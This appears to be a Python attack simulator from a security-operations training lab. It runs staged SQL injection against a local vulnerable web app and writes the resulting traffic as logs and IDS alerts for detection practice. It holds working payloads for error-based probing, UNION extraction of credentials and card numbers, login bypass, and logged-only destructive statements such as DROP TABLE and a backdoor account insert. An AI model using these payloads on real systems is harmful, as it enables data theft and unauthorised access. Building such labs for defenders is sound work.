#!/usr/bin/env python3
"""
Scenario 13: SQL Injection Attack Simulation.

Simulates a progressive SQL injection attack against the vulnerable web app,
generating realistic attack traffic and logs for SOC detection.
"""

import json
import os
import sys
import time

import requests
from colorama import Fore, Style, init

# Add project root to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "..", ".."))

from wcace_lib.log_generator import LogGenerator
from wcace_lib.siem_client import SIEMClient
from wcace_lib.constants import ATTACKER_IP, WEB_SERVER_IP

init(autoreset=True)

TARGET_URL = os.environ.get("TARGET_URL", "http://localhost:5000")
LOG_DIR = os.path.join(os.path.dirname(__file__), "..", "logs", "sample_logs")


def banner():
    print(f"""
{Fore.RED}╔══════════════════════════════════════════════════════════╗
║  WCACE Scenario 13: SQL Injection Attack Simulation     ║
║  Target: {TARGET_URL:<47s} ║
║  ⚠  Educational use only                                ║
╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}
""")


def phase_1_reconnaissance(session: requests.Session, log_gen: LogGenerator) -> list[str]:
    """Phase 1: Probe for SQL injection points."""
    print(f"{Fore.YELLOW}[Phase 1] Reconnaissance - Probing for SQLi vectors{Style.RESET_ALL}")
    logs = []

    # Test endpoints
    endpoints = ["/", "/login", "/search?q=test", "/users", "/transactions?user_id=1"]
    for ep in endpoints:
        try:
            resp = session.get(f"{TARGET_URL}{ep}", timeout=5)
            print(f"  [+] {ep} -> {resp.status_code}")
            logs.append(log_gen.web_access_log(ATTACKER_IP, "GET", ep, resp.status_code))
        except requests.exceptions.RequestException as e:
            print(f"  [-] {ep} -> ERROR: {e}")
    return logs


def phase_2_error_based(session: requests.Session, log_gen: LogGenerator) -> list[str]:
    """Phase 2: Error-based SQL injection to fingerprint database."""
    print(f"\n{Fore.YELLOW}[Phase 2] Error-Based SQLi - Database Fingerprinting{Style.RESET_ALL}")
    logs = []

    error_payloads = [
        ("search", {"q": "'"}),
        ("search", {"q": "' OR '1'='1"}),
        ("search", {"q": "' AND 1=CONVERT(int,@@version)--"}),
        ("transactions", {"user_id": "1 OR 1=1"}),
        ("transactions", {"user_id": "1; SELECT sqlite_version()"}),
    ]

    for endpoint, params in error_payloads:
        try:
            resp = session.get(f"{TARGET_URL}/{endpoint}", params=params, timeout=5)
            body = resp.json()
            status = "✓ ERROR EXPOSED" if "error" in str(body).lower() else "→ " + str(resp.status_code)
            print(f"  [+] /{endpoint}?{list(params.values())[0][:40]:<40s} {status}")

            param_str = "&".join(f"{k}={v}" for k, v in params.items())
            logs.append(log_gen.web_access_log(
                ATTACKER_IP, "GET", f"/{endpoint}?{param_str}", resp.status_code
            ))
            logs.append(log_gen.ids_alert(
                ATTACKER_IP, WEB_SERVER_IP,
                f"SQL Injection Probe: {list(params.values())[0][:30]}",
                sid=9000001, severity=1
            ))
        except requests.exceptions.RequestException:
            pass
        time.sleep(0.3)
    return logs


def phase_3_union_extraction(session: requests.Session, log_gen: LogGenerator) -> list[str]:
    """Phase 3: UNION-based extraction of database contents."""
    print(f"\n{Fore.YELLOW}[Phase 3] UNION-Based Extraction - Dumping Data{Style.RESET_ALL}")
    logs = []

    # Determine column count
    for n in range(1, 8):
        cols = ",".join(["NULL"] * n)
        payload = f"' UNION SELECT {cols}--"
        try:
            resp = session.get(f"{TARGET_URL}/search", params={"q": payload}, timeout=5)
            if resp.status_code == 200 and "error" not in resp.text.lower():
                print(f"  [+] Column count: {n}")
                break
        except requests.exceptions.RequestException:
            pass

    # Extract table names (SQLite)
    union_payloads = [
        "' UNION SELECT NULL,name,NULL,NULL,NULL FROM sqlite_master WHERE type='table'--",
        "' UNION SELECT NULL,username,password,email,role FROM users--",
        "' UNION SELECT NULL,card_number,amount,description,NULL FROM transactions--",
    ]

    for payload in union_payloads:
        try:
            resp = session.get(f"{TARGET_URL}/search", params={"q": payload}, timeout=5)
            data = resp.json()
            results = data.get("results", [])
            if results:
                print(f"  {Fore.RED}[!] Extracted {len(results)} records:{Style.RESET_ALL}")
                for r in results[:3]:
                    print(f"      → {dict(r)}")
            logs.append(log_gen.web_access_log(
                ATTACKER_IP, "GET", f"/search?q={payload[:60]}", resp.status_code
            ))
            logs.append(log_gen.ids_alert(
                ATTACKER_IP, WEB_SERVER_IP,
                "SQL Injection: UNION SELECT data extraction",
                sid=9000001, severity=1
            ))
        except requests.exceptions.RequestException:
            pass
        time.sleep(0.5)
    return logs


def phase_4_auth_bypass(session: requests.Session, log_gen: LogGenerator) -> list[str]:
    """Phase 4: Authentication bypass via SQL injection."""
    print(f"\n{Fore.YELLOW}[Phase 4] Authentication Bypass{Style.RESET_ALL}")
    logs = []

    auth_payloads = [
        {"username": "admin'--", "password": "anything"},
        {"username": "' OR 1=1--", "password": ""},
        {"username": "admin", "password": "' OR '1'='1"},
    ]

    for creds in auth_payloads:
        try:
            resp = session.post(f"{TARGET_URL}/login", data=creds, timeout=5)
            data = resp.json()
            if data.get("status") == "success":
                print(f"  {Fore.RED}[!] AUTH BYPASS SUCCESS: {creds['username']}")
                print(f"      Role: {data.get('role')}, Name: {data.get('message')}{Style.RESET_ALL}")
            else:
                print(f"  [-] Failed: {creds['username']}")

            logs.append(log_gen.web_access_log(
                ATTACKER_IP, "POST", "/login", resp.status_code,
                user_agent="sqlmap/1.7"
            ))
        except requests.exceptions.RequestException:
            pass
        time.sleep(0.3)
    return logs


def phase_5_destructive(session: requests.Session, log_gen: LogGenerator) -> list[str]:
    """Phase 5: Destructive payload attempt (simulated, logged only)."""
    print(f"\n{Fore.YELLOW}[Phase 5] Destructive Payload (Logged, Not Executed Against DB){Style.RESET_ALL}")
    logs = []

    destructive_payloads = [
        "'; DROP TABLE users;--",
        "'; UPDATE users SET role='admin' WHERE username='attacker';--",
        "'; INSERT INTO users VALUES(99,'backdoor','pass123','hack@evil.com','admin','Backdoor');--",
    ]

    for payload in destructive_payloads:
        print(f"  [*] Payload logged: {payload[:60]}...")
        logs.append(log_gen.web_access_log(
            ATTACKER_IP, "GET", f"/search?q={payload}", 500
        ))
        logs.append(log_gen.ids_alert(
            ATTACKER_IP, WEB_SERVER_IP,
            f"SQL Injection: Destructive payload - {payload[:30]}",
            sid=9000004, severity=1
        ))
    return logs


def main():
    banner()

    # Check if target is reachable
    session = requests.Session()
    try:
        resp = session.get(TARGET_URL, timeout=5)
        print(f"{Fore.GREEN}[*] Target reachable: {TARGET_URL}{Style.RESET_ALL}\n")
    except requests.exceptions.RequestException:
        print(f"{Fore.RED}[!] Target unreachable. Start the vuln app first:")
        print(f"    python3 attack/vuln_app.py{Style.RESET_ALL}")
        print(f"\n[*] Generating sample logs in offline mode...\n")

    log_gen = LogGenerator(source_host="attacker-kali")
    all_logs = []

    # Execute attack phases
    all_logs.extend(phase_1_reconnaissance(session, log_gen))
    all_logs.extend(phase_2_error_based(session, log_gen))
    all_logs.extend(phase_3_union_extraction(session, log_gen))
    all_logs.extend(phase_4_auth_bypass(session, log_gen))
    all_logs.extend(phase_5_destructive(session, log_gen))

    # Save logs
    os.makedirs(LOG_DIR, exist_ok=True)
    log_file = os.path.join(LOG_DIR, "sqli_attack.jsonl")
    SIEMClient.write_logs_to_file(all_logs, log_file)

    print(f"\n{Fore.GREEN}[*] Attack simulation complete")
    print(f"[*] {len(all_logs)} log entries written to {log_file}{Style.RESET_ALL}")

    # Try to send to Loki if available
    try:
        siem = SIEMClient()
        siem.loki_push_lines(
            {"job": "attack_sim", "scenario": "13-sqli"},
            all_logs
        )
        print(f"[*] Logs pushed to Loki")
    except Exception:
        print(f"[*] Loki not available - logs saved locally only")


if __name__ == "__main__":
    main()
